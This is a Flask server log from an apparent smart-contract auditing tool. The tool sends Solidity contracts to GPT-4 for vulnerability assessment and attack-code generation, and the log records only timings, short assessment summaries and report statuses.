2025-06-19 16:19:23,006 - werkzeug - INFO - 192.168.96.1 - - [19/Jun/2025 16:19:23] "POST /analyze HTTP/1.1" 200 -
2025-06-19 16:28:54,508 - app.app - INFO - Application started
2025-06-19 16:28:54,527 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.128.5:8000
2025-06-19 16:28:54,530 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-19 16:29:01,795 - werkzeug - INFO - 192.168.128.1 - - [19/Jun/2025 16:29:01] "OPTIONS /login HTTP/1.1" 200 -
2025-06-19 16:29:02,334 - werkzeug - INFO - 192.168.128.1 - - [19/Jun/2025 16:29:02] "POST /login HTTP/1.1" 200 -
2025-06-19 16:29:11,653 - werkzeug - INFO - 192.168.128.1 - - [19/Jun/2025 16:29:11] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-19 16:29:11,687 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-19 16:29:11,701 - app.api.contract - INFO - Analyzing code snippet
2025-06-19 16:29:11,709 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-19 16:29:11,857 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-06-19 16:29:12,936 - solcx - INFO - Using solc version 0.8.0
2025-06-19 16:29:12,940 - solcx - INFO - solc 0.8.0 successfully installed at: /root/.solcx/solc-v0.8.0
2025-06-19 16:29:12,944 - solcx - INFO - Using solc version 0.8.0
2025-06-19 16:29:16,443 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-19 16:29:17,298 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-06-19 16:29:17,300 - app.modules.attack_generator - INFO - Contract name: SimpleStorage
2025-06-19 16:29:17,301 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-06-19 16:29:17,302 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-06-19 16:29:17,305 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-19 16:29:17,306 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-19 16:29:17,307 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-19 16:29:28,662 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-19 16:29:28,691 - app.modules.attack_generator - INFO - Received response from OpenAI API in 11.38 seconds
2025-06-19 16:29:28,702 - app.modules.attack_generator - INFO - Contract analysis completed in 11.38 seconds
2025-06-19 16:29:28,704 - app.modules.attack_generator - INFO - Vulnerability assessment: The contract does not have any major security vulnerabilities. However, it has a design flaw. The `s...
2025-06-19 16:29:28,707 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-06-19 16:29:28,710 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-19 16:29:28,711 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-19 16:29:28,713 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-19 16:29:33,156 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-19 16:29:33,181 - app.modules.attack_generator - INFO - Received response from OpenAI API in 4.47 seconds
2025-06-19 16:29:33,187 - app.modules.attack_generator - INFO - Attack code generation completed in 4.47 seconds
2025-06-19 16:29:33,189 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 368
2025-06-19 16:29:33,191 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 15.85 seconds
2025-06-19 16:29:33,194 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-06-19 16:29:33,247 - app.api.contract - INFO - Report saved with filename: SimpleStorage_2025-06-19_16-29, status: KO
2025-06-19 16:29:33,250 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-19 16:29:33,254 - werkzeug - INFO - 192.168.128.1 - - [19/Jun/2025 16:29:33] "POST /analyze HTTP/1.1" 200 -
2025-06-19 16:30:16,086 - werkzeug - INFO - 192.168.128.1 - - [19/Jun/2025 16:30:16] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-19 16:30:16,116 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-19 16:30:16,127 - app.api.contract - INFO - Analyzing code snippet
2025-06-19 16:30:16,137 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-19 16:30:16,160 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-19_16-30, status: ERROR
2025-06-19 16:30:16,162 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-19 16:30:16,165 - werkzeug - INFO - 192.168.128.1 - - [19/Jun/2025 16:30:16] "POST /analyze HTTP/1.1" 200 -
2025-06-19 16:30:25,973 - werkzeug - INFO - 192.168.128.1 - - [19/Jun/2025 16:30:25] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-19 16:30:26,000 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-19 16:30:26,012 - app.api.contract - INFO - Analyzing code snippet
2025-06-19 16:30:26,020 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-19 16:30:26,032 - solcx - INFO - Using solc version 0.8.0
2025-06-19 16:30:27,670 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-19 16:30:28,435 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-06-19 16:30:28,437 - app.modules.attack_generator - INFO - Contract name: SimpleStorage
2025-06-19 16:30:28,439 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-06-19 16:30:28,440 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-06-19 16:30:28,442 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-19 16:30:28,443 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-19 16:30:28,444 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-19 16:30:39,583 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-19 16:30:39,607 - app.modules.attack_generator - INFO - Received response from OpenAI API in 11.16 seconds
2025-06-19 16:30:39,612 - app.modules.attack_generator - INFO - Contract analysis completed in 11.16 seconds
2025-06-19 16:30:39,615 - app.modules.attack_generator - INFO - Vulnerability assessment: The contract does not have any security vulnerabilities in the traditional sense (reentrancy, logic ...
2025-06-19 16:30:39,617 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-06-19 16:30:39,620 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-19 16:30:39,621 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-19 16:30:39,623 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-19 16:30:44,352 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-19 16:30:44,377 - app.modules.attack_generator - INFO - Received response from OpenAI API in 4.76 seconds
2025-06-19 16:30:44,381 - app.modules.attack_generator - INFO - Attack code generation completed in 4.76 seconds
2025-06-19 16:30:44,383 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 305
2025-06-19 16:30:44,386 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 15.92 seconds
2025-06-19 16:30:44,388 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-06-19 16:30:44,416 - app.api.contract - INFO - Report saved with filename: SimpleStorage_2025-06-19_16-30, status: KO
2025-06-19 16:30:44,418 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-19 16:30:44,422 - werkzeug - INFO - 192.168.128.1 - - [19/Jun/2025 16:30:44] "POST /analyze HTTP/1.1" 200 -
2025-06-19 16:37:38,965 - app.app - INFO - Application started
2025-06-19 16:37:38,978 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.160.5:8000
2025-06-19 16:37:38,980 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-19 16:37:41,034 - werkzeug - INFO - 192.168.160.1 - - [19/Jun/2025 16:37:41] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-19 16:37:41,065 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-19 16:37:41,082 - app.api.contract - INFO - Analyzing code snippet
2025-06-19 16:37:41,162 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-19 16:37:41,222 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-19_16-37, status: ERROR
2025-06-19 16:37:41,224 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-19 16:37:41,228 - werkzeug - INFO - 192.168.160.1 - - [19/Jun/2025 16:37:41] "POST /analyze HTTP/1.1" 200 -
2025-06-19 16:37:52,934 - werkzeug - INFO - 192.168.160.1 - - [19/Jun/2025 16:37:52] "OPTIONS /history HTTP/1.1" 200 -
2025-06-19 16:37:52,985 - werkzeug - INFO - 192.168.160.1 - - [19/Jun/2025 16:37:52] "GET /history HTTP/1.1" 200 -
2025-06-21 10:35:18,278 - app.app - INFO - Application started
2025-06-21 10:35:18,291 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.22.0.5:8000
2025-06-21 10:35:18,293 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-21 10:35:51,996 - app.app - INFO - Application started
2025-06-21 10:35:52,008 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.24.0.5:8000
2025-06-21 10:35:52,011 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-21 10:36:14,419 - werkzeug - INFO - 172.24.0.1 - - [21/Jun/2025 10:36:14] "OPTIONS /register HTTP/1.1" 200 -
2025-06-21 10:36:14,913 - werkzeug - INFO - 172.24.0.1 - - [21/Jun/2025 10:36:14] "POST /register HTTP/1.1" 200 -
2025-06-21 10:36:20,063 - werkzeug - INFO - 172.24.0.1 - - [21/Jun/2025 10:36:20] "OPTIONS /login HTTP/1.1" 200 -
2025-06-21 10:36:20,471 - werkzeug - INFO - 172.24.0.1 - - [21/Jun/2025 10:36:20] "POST /login HTTP/1.1" 200 -
2025-06-21 10:42:55,315 - app.app - INFO - Application started
2025-06-21 10:42:55,345 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.26.0.5:8000
2025-06-21 10:42:55,348 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-21 10:42:57,838 - werkzeug - INFO - 172.26.0.1 - - [21/Jun/2025 10:42:57] "OPTIONS /login HTTP/1.1" 200 -
2025-06-21 10:42:58,325 - werkzeug - INFO - 172.26.0.1 - - [21/Jun/2025 10:42:58] "POST /login HTTP/1.1" 200 -
2025-06-21 10:43:06,925 - werkzeug - INFO - 172.26.0.1 - - [21/Jun/2025 10:43:06] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-21 10:43:06,959 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 10:43:06,971 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 10:43:06,988 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-21 10:43:07,188 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-06-21 10:43:08,132 - solcx - INFO - Using solc version 0.8.0
2025-06-21 10:43:08,134 - solcx - INFO - solc 0.8.0 successfully installed at: /root/.solcx/solc-v0.8.0
2025-06-21 10:43:08,138 - solcx - INFO - Using solc version 0.8.0
2025-06-21 10:43:13,341 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-21 10:43:14,689 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-06-21 10:43:14,692 - app.modules.attack_generator - INFO - Contract name: Counter
2025-06-21 10:43:14,693 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-06-21 10:43:14,694 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-06-21 10:43:14,697 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-21 10:43:14,698 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-21 10:43:14,700 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-21 10:43:24,203 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-21 10:43:24,229 - app.modules.attack_generator - INFO - Received response from OpenAI API in 9.53 seconds
2025-06-21 10:43:24,240 - app.modules.attack_generator - INFO - Contract analysis completed in 9.53 seconds
2025-06-21 10:43:24,243 - app.modules.attack_generator - INFO - Vulnerability assessment: This contract does not seem to have any security vulnerabilities. It does not hold any Ether, so the...
2025-06-21 10:43:24,246 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-06-21 10:43:24,249 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-21 10:43:24,253 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-21 10:43:24,255 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-21 10:43:29,049 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-21 10:43:29,072 - app.modules.attack_generator - INFO - Received response from OpenAI API in 4.82 seconds
2025-06-21 10:43:29,079 - app.modules.attack_generator - INFO - Attack code generation completed in 4.82 seconds
2025-06-21 10:43:29,083 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 447
2025-06-21 10:43:29,086 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 14.35 seconds
2025-06-21 10:43:29,088 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-06-21 10:43:29,141 - app.api.contract - INFO - Report saved with filename: Counter_2025-06-21_10-43, status: KO
2025-06-21 10:43:29,143 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 10:43:29,146 - werkzeug - INFO - 172.26.0.1 - - [21/Jun/2025 10:43:29] "POST /analyze HTTP/1.1" 200 -
2025-06-21 10:43:36,574 - werkzeug - INFO - 172.26.0.1 - - [21/Jun/2025 10:43:36] "OPTIONS /feedback HTTP/1.1" 200 -
2025-06-21 10:43:36,599 - app.api.feedback - INFO - Received feedback submission from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 10:43:36,657 - app.api.feedback - INFO - Feedback saved with ID: 1, status: OK
2025-06-21 10:43:36,659 - werkzeug - INFO - 172.26.0.1 - - [21/Jun/2025 10:43:36] "POST /feedback HTTP/1.1" 200 -
2025-06-21 10:43:39,891 - werkzeug - INFO - 172.26.0.1 - - [21/Jun/2025 10:43:39] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 10:43:39,932 - werkzeug - INFO - 172.26.0.1 - - [21/Jun/2025 10:43:39] "[35m[1mGET /history HTTP/1.1[0m" 500 -
2025-06-21 10:43:42,602 - werkzeug - INFO - 172.26.0.1 - - [21/Jun/2025 10:43:42] "[35m[1mGET /history HTTP/1.1[0m" 500 -
2025-06-21 10:45:49,684 - werkzeug - INFO - 172.26.0.1 - - [21/Jun/2025 10:45:49] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 10:45:49,735 - werkzeug - INFO - 172.26.0.1 - - [21/Jun/2025 10:45:49] "[35m[1mGET /history HTTP/1.1[0m" 500 -
2025-06-21 10:47:29,630 - app.app - INFO - Application started
2025-06-21 10:47:29,645 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.29.0.5:8000
2025-06-21 10:47:29,647 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-21 10:47:32,252 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:47:32] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 10:47:32,437 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:47:32] "GET /history HTTP/1.1" 200 -
2025-06-21 10:47:45,095 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:47:45] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-21 10:47:45,124 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 10:47:45,138 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 10:47:45,147 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-21 10:47:45,186 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-21_10-47, status: ERROR
2025-06-21 10:47:45,187 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 10:47:45,190 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:47:45] "POST /analyze HTTP/1.1" 200 -
2025-06-21 10:47:46,747 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:47:46] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 10:47:46,788 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:47:46] "GET /history HTTP/1.1" 200 -
2025-06-21 10:47:49,118 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:47:49] "OPTIONS /feedback HTTP/1.1" 200 -
2025-06-21 10:47:49,145 - app.api.feedback - INFO - Received feedback submission from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 10:47:49,194 - app.api.feedback - INFO - Feedback saved with ID: 2, status: KO
2025-06-21 10:47:49,197 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:47:49] "POST /feedback HTTP/1.1" 200 -
2025-06-21 10:48:44,289 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:48:44] "OPTIONS /login HTTP/1.1" 200 -
2025-06-21 10:48:44,914 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:48:44] "POST /login HTTP/1.1" 200 -
2025-06-21 10:48:48,345 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:48:48] "POST /login HTTP/1.1" 200 -
2025-06-21 10:49:27,700 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:49:27] "OPTIONS /register HTTP/1.1" 200 -
2025-06-21 10:49:28,169 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:49:28] "POST /register HTTP/1.1" 200 -
2025-06-21 10:49:45,194 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:49:45] "OPTIONS /login HTTP/1.1" 200 -
2025-06-21 10:49:45,639 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:49:45] "POST /login HTTP/1.1" 200 -
2025-06-21 10:50:54,833 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:50:54] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-21 10:50:54,865 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 10:50:54,875 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 10:50:54,889 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-21 10:50:54,929 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-21_10-50, status: ERROR
2025-06-21 10:50:54,931 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 10:50:54,935 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:50:54] "POST /analyze HTTP/1.1" 200 -
2025-06-21 10:51:00,130 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:51:00] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 10:51:00,171 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:51:00] "GET /history HTTP/1.1" 200 -
2025-06-21 10:51:18,421 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:51:18] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 10:51:18,464 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:51:18] "GET /history HTTP/1.1" 200 -
2025-06-21 10:52:56,057 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:52:56] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-21 10:52:56,091 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 10:52:56,100 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 10:52:56,114 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-21 10:52:56,275 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-06-21 10:52:57,233 - solcx - INFO - Using solc version 0.8.0
2025-06-21 10:52:57,236 - solcx - INFO - solc 0.8.0 successfully installed at: /root/.solcx/solc-v0.8.0
2025-06-21 10:52:57,240 - solcx - INFO - Using solc version 0.8.0
2025-06-21 10:52:58,763 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:52:58] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 10:52:58,796 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:52:58] "GET /history HTTP/1.1" 200 -
2025-06-21 10:52:59,446 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-06-21 10:52:59,448 - app.modules.attack_generator - INFO - Contract name: SimpleWallet
2025-06-21 10:52:59,449 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-06-21 10:52:59,450 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-06-21 10:52:59,453 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-21 10:52:59,456 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-21 10:52:59,457 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-21 10:53:02,197 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:53:02] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-21 10:53:02,226 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 10:53:02,237 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 10:53:02,248 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-21 10:53:02,260 - solcx - INFO - Using solc version 0.8.0
2025-06-21 10:53:03,688 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-06-21 10:53:03,690 - app.modules.attack_generator - INFO - Contract name: SimpleWallet
2025-06-21 10:53:03,691 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-06-21 10:53:03,693 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-06-21 10:53:03,695 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-21 10:53:03,696 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-21 10:53:03,697 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-21 10:53:10,778 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-21 10:53:10,819 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-21 10:53:10,823 - app.modules.attack_generator - INFO - Received response from OpenAI API in 7.13 seconds
2025-06-21 10:53:10,829 - app.modules.attack_generator - INFO - Received response from OpenAI API in 11.37 seconds
2025-06-21 10:53:10,833 - app.modules.attack_generator - INFO - Contract analysis completed in 7.13 seconds
2025-06-21 10:53:10,835 - app.modules.attack_generator - INFO - Contract analysis completed in 11.37 seconds
2025-06-21 10:53:10,836 - app.modules.attack_generator - INFO - Vulnerability assessment: The contract appears to be secure. It has a check to ensure that only the owner can withdraw funds, ...
2025-06-21 10:53:10,837 - app.modules.attack_generator - INFO - Vulnerability assessment: The contract seems to be secure against common vulnerabilities such as reentrancy, logic bugs, math ...
2025-06-21 10:53:10,838 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-06-21 10:53:10,840 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-06-21 10:53:10,841 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-21 10:53:10,842 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-21 10:53:10,843 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-21 10:53:10,844 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-21 10:53:10,846 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-21 10:53:10,847 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-21 10:53:14,223 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-21 10:53:14,249 - app.modules.attack_generator - INFO - Received response from OpenAI API in 3.40 seconds
2025-06-21 10:53:14,255 - app.modules.attack_generator - INFO - Attack code generation completed in 3.40 seconds
2025-06-21 10:53:14,258 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 301
2025-06-21 10:53:14,260 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 14.78 seconds
2025-06-21 10:53:14,262 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-06-21 10:53:14,285 - app.api.contract - INFO - Report saved with filename: SimpleWallet_2025-06-21_10-53, status: KO
2025-06-21 10:53:14,287 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 10:53:14,291 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:53:14] "POST /analyze HTTP/1.1" 200 -
2025-06-21 10:53:16,637 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-21 10:53:16,658 - app.modules.attack_generator - INFO - Received response from OpenAI API in 5.81 seconds
2025-06-21 10:53:16,663 - app.modules.attack_generator - INFO - Attack code generation completed in 5.81 seconds
2025-06-21 10:53:16,665 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 494
2025-06-21 10:53:16,669 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 12.94 seconds
2025-06-21 10:53:16,672 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-06-21 10:53:16,689 - app.api.contract - INFO - Report saved with filename: SimpleWallet_2025-06-21_10-53, status: KO
2025-06-21 10:53:16,691 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 10:53:16,695 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:53:16] "POST /analyze HTTP/1.1" 200 -
2025-06-21 10:53:24,917 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:53:24] "OPTIONS /feedback HTTP/1.1" 200 -
2025-06-21 10:53:24,947 - app.api.feedback - INFO - Received feedback submission from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 10:53:24,968 - app.api.feedback - WARNING - User 1 has already submitted feedback for report 1
2025-06-21 10:53:24,972 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:53:24] "[31m[1mPOST /feedback HTTP/1.1[0m" 400 -
2025-06-21 10:53:33,586 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:53:33] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 10:53:33,624 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:53:33] "GET /history HTTP/1.1" 200 -
2025-06-21 10:53:36,230 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:53:36] "OPTIONS /feedback HTTP/1.1" 200 -
2025-06-21 10:53:36,254 - app.api.feedback - INFO - Received feedback submission from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 10:53:36,283 - app.api.feedback - INFO - Feedback saved with ID: 3, status: OK
2025-06-21 10:53:36,287 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 10:53:36] "POST /feedback HTTP/1.1" 200 -
